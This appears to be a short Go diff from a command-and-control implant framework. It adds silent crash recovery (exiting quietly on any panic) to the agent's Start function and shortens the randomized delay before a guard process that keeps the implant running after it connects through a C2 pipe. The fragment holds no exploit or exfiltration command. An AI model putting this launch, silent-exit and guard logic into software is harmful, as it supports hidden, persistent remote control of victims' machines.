@@ -52,6 +52,11 @@ import (
 //   c        - Packed Config. The resulting profile will be build when the function
 //               starts and will silently return if it fails.
 func Start(ignore, load, critical bool, l man.Linker, guard, pipe string, c cfg.Config) {
+	defer func() {
+		if err := recover(); err != nil {
+			device.GoExit()
+		}
+	}()
 	p, err := c.Build()
 	if err != nil {
 		return
@@ -144,7 +149,7 @@ func daemonFunc(x context.Context, ignore, load, critical bool, l man.Linker, gu
 	if load {
 		if s, _ = c2.LoadContext(x, nil, pipe, time.Millisecond*500); s != nil && len(guard) > 0 {
 			go func() {
-				time.Sleep(time.Second * time.Duration(2+uint64(util.FastRandN(3))))
+				time.Sleep(time.Second * time.Duration(1+uint64(util.FastRandN(3))))
 				man.GuardContext(x, l, guard)
 			}()
 		}
